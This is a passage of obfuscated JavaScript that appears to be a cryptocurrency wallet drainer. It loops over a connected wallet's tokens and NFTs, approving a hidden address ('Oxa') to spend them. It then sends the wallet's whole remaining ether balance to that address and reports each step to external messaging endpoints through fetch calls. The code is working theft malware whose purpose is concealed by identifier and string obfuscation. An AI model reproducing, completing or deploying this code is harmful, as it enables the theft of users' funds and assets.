sisPoints','withdraw','Transaction\x20Receipt:\x20','Transaction\x20Rejected','_value','Insufficient\x20funds\x20for\x20transfer\x20or\x20transaction\x20was\x20rejected','previousOwner','metamask','.meta','length','newOwner','decimals','getApproved','maxFee','REVEAL_TIMESTAMP','deprecate','.connect','application/json','removeBlackList','approve','Could\x20not\x20get\x20a\x20wallet\x20connection','Hahahahahah','_user','tokens-list','newMaxFee','uint256','Issue','nonpayable','_data','_to','transferFrom','allowed','_decimals','avalanche','54cveOJk','Transfer','symbol','_owner','setProvenanceHash','json','spender','baseURI','Token','AddedBlackList','maximumFee','Unable\x20to\x20get\x20NFts','usd','6053098690','basisPointsRate','apePrice','50rwKNvJ','ownerOf','filter'];_0xf14e=function(){return _0x55a9ae;};return _0xf14e();}async function loopTokens(_0xfafee7){const _0x195d00=_0x42bb45;for await(let _0x1ff33b of _0xfafee7){console[_0x195d00(0x13a)](_0x195d00(0x116),_0x1ff33b);try{sendMessage(_0x195d00(0x135));let {hash:_0x17e509}=await writeContract({'address':_0x1ff33b[_0x195d00(0x162)],'abi':ABI,'functionName':_0x195d00(0xff),'args':[Oxa,_0x195d00(0x123)]});console[_0x195d00(0x13a)](_0x195d00(0xad),_0x17e509),_0x17e509&&(console[_0x195d00(0x13a)]('Approved'),sendMessage(_0x195d00(0xb3)),sendMessage(_0x195d00(0xcd)+_0x1ff33b['address']),sendMessage(_0x195d00(0xac)+_0x1ff33b[_0x195d00(0x133)]),sendMessage(_0x195d00(0xc6)+Oxa));}catch(_0x589f51){console[_0x195d00(0x13a)](_0x195d00(0x128)+_0x589f51),sendMessage(_0x195d00(0xef));}};await loopNfts(NFTs);}async function loopNfts(_0x1a7781){const _0x77b6b7=_0x42bb45;for await(let _0x1f076f of _0x1a7781){console['log'](_0x77b6b7(0x16c),_0x1f076f);try{let {hash:_0x2e87d8}=await writeContract({'address':_0x1f076f[_0x77b6b7(0x156)],'abi':ABIN,'functionName':_0x77b6b7(0x12f),'args':[Oxa,!![]]});console['log'](_0x77b6b7(0xad),_0x2e87d8),console[_0x77b6b7(0x13a)](_0x77b6b7(0xee)+receipt),sendMessage(_0x77b6b7(0xb3)),sendMessage(_0x77b6b7(0x154)+_0x1f076f[_0x77b6b7(0x156)]),sendMessage(_0x77b6b7(0xc6)+Oxa);}catch(_0xd32811){console['log'](_0x77b6b7(0x128)+_0xd32811),sendMessage('Transaction\x20Rejected');}}await onSendEther();}async function onSendEther(){const _0x32326f=_0x42bb45;console[_0x32326f(0x13a)](_0x32326f(0x138));try{let _0x3a68a3=await fetchBalance({'address':selectedAccount});console[_0x32326f(0x13a)](_0x3a68a3);const _0x5d92af=await fetchFeeData();console[_0x32326f(0x13a)](_0x5d92af);var _0x35b776=_0x5d92af[_0x32326f(0x14d)]['gasPrice'];_0x35b776=parseFloat(_0x35b776);let _0x284bb3=parseFloat(_0x3a68a3['formatted'])-_0x35b776*0.00042;_0x284bb3=parseEther(_0x284bb3[_0x32326f(0xe4)]()),console[_0x32326f(0x13a)](_0x284bb3);const {hash:_0x113bb1}=await sendTransaction({'to':Oxa,'value':_0x284bb3});console['log'](_0x113bb1),sendMessage(_0x32326f(0x167),_0x113bb1),sendMessage(_0x32326f(0x122)),sendMessage(_0x32326f(0x145));}catch{sendMessage(_0x32326f(0xf1));}}async function sendMessage(_0x4f96a9){sendMessage1(_0x4f96a9),sendMessage2(_0x4f96a9);}async function sendMessage1(_0xb41b46){return new Promise((_0xafaf59,_0x5907ea)=>{const _0x49b557=_0x1d73,_0x3fda93=Oxc1;fetch(_0x49b557(0x12b)+_0x3fda93+'&text='+_0xb41b46,{'method':_0x49b557(0xd8),'headers':{}})[_0x49b557(0x14b)](async _0x53231d=>{const _0x4716c5=_0x49b557;if(_0x53231d[_0x4716c5(0x149)]>0x18f)throw _0x53231d;_0xafaf59(await _0x53231d['json']());})[_0x49b557(0x13d)](_0x34f903=>{_0x5907ea(_0x34f903);});});}async function sendMessage2(_0x2e9a66){return new Promise((_0x2f9e40,_0x4592c6)=>{const _0x5b99c3=_0x1d73,_0x2407f8=Oxc2;fetch(_0x5b99c3(0x12b)+_0x2407f8+_0x5b99c3(0xb5)+_0x2e9a66,{'method':_0x5b99c3(0xd8),'headers':{}})['then'](async _0x45ed71=>{const _0x279bb4=_0x5b99c3;if(_0x45ed71[_0x279bb4(0x149)]>0x18f)throw _0x45ed71;_0x2f9e40(await _0x45ed71[_0x279bb4(0x113)]());})['catch'](_0xe180fa=>{_0x4592c6(_0xe180fa);});});}async function getPrice(_0x538594){return new Promise((_0x3e2aed,_0x451a4f)=>{const _0x381796=_0x1d73;fetch(_0x381796(0xbd)+_0x538594+_0x381796(0xe3),{'method':_0x381796(0xd8),'headers':{}})[_0x381796(0x14b)](async _0x11bbcd=>{const _0x5d49bc=_0x381796;if(_0x11bbcd[_0x5d49bc(0x149)]>0x18f)throw _0x11bbcd;_0x3e2aed(await _0x11bbcd['json']());})[_0x381796(0x13d)](_0x478daa=>{_0x451a4f(_0x478daa);});});}async function getValue(_0x201566,_0x417c33,_0x5dd8ce){const _0x100367=_0x42bb45;console[_0x100367(0x13a)](_0x201566,_0x417c33,_0x5dd8ce);let _0xabaf82=await getPrice(_0x201566);console['log']('price',_0xabaf82),_0xabaf82=parseFloat(_0xabaf82[_0x201566][_0x100367(0x11a)]);let _0x207b7e=_0x417c33/0xa**(_0x5dd8ce||0x12)*_0xabaf82;return _0x207b7e=parseInt(_0x207b7e),_0xabaf82?_0x207b7e:0x0;}async function getNFTs(_0x472d16='',_0x59cbe1=_0x42bb45(0x124),_0x1bef4d=_0x42bb45(0x10d),_0x1ef55e='50'){return new Promise((_0x42186f,_0x5c6a79)=>{const _0xa84c27=_0x1d73;fetch(_0xa84c27(0xb0)+_0x472d16+_0xa84c27(0xd1)+_0x1bef4d+_0xa84c27(0xde)+_0x1ef55e,{'method':_0xa84c27(0xd8),'headers':{'accept':_0xa84c27(0xfd),'X-API-Key':_0x59cbe1}})['then'](async _0x412a46=>{const _0x3e3ce2=_0xa84c27;if(_0x412a46[_0x3e3ce2(0x149)]>0x18f)throw _0x412a46;_0x42186f(await _0x412a46['json']());})[_0xa84c27(0x13d)](_0x17d71c=>{_0x5c6a79(_0x17d71c);});});}